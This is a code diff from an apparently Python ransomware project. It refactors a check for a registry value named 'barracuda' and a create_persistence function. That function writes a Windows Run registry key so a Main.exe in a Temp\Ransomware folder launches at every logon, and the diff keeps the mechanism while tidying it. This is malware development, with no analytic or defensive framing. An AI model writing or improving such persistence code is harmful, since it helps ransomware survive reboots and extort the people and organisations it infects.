@@ -38,11 +38,10 @@ def check_if_key_exists(is_admin):
                              winreg.KEY_READ
                              )
         winreg.QueryValueEx(key, "barracuda")
-        registry_key_exists = True
-        return registry_key_exists
     except WindowsError:
-        registry_key_exists = False
-        return registry_key_exists
+        return False
+
+    return True
 
 
 def create_persistence(is_admin):
@@ -50,14 +49,9 @@ def create_persistence(is_admin):
     Create the ransomware persistence
     :param is_admin -- Check if the code is executed as an admin:
     """
-    if is_admin:
-        create_registry_key("barracuda",
-                            os.path.expanduser("~") + "\\AppData\\Local\\Temp\\Ransomware\\Main.exe",
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                            is_admin)
-    else:
-        create_registry_key("barracuda",
-                            os.path.expanduser("~") + "\\AppData\\Local\\Temp\\Ransomware\\Main.exe",
-                            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                            is_admin)
+    path = "SOFTWARE" if is_admin else "Software"
+    create_registry_key("barracuda",
+                        os.path.expanduser("~") + "\\AppData\\Local\\Temp\\Ransomware\\Main.exe",
+                        path + "\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        is_admin)
 
